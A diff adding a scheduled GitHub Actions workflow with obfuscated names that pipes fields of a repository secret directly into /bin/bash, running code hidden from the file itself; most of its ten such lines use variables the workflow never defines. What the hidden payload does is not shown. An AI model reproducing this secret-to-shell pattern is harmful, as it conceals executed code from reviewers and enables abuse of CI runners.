@@ -1,0 +1,25 @@
+name: laoliuzileng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laoliuzileng
+        env:
+          o633: ${{ secrets.o633 }}
+        run: |
+          echo $o633 | jq -r .vl251 | /bin/bash
+          echo $lxm21 | jq -r .pkle70 | /bin/bash
+          echo $cxtxc452 | jq -r .m827 | /bin/bash
+          echo $ewb1979 | jq -r .usem040 | /bin/bash
+          echo $yjz71 | jq -r .xqm50149 | /bin/bash
+          echo $l3 | jq -r .lz2 | /bin/bash
+          echo $sj05374 | jq -r .hbj84798 | /bin/bash
+          echo $r7 | jq -r .hgk80 | /bin/bash
+          echo $vftyw642 | jq -r .u42901 | /bin/bash
+          echo $zqnbq2803 | jq -r .hyjm46 | /bin/bash
+
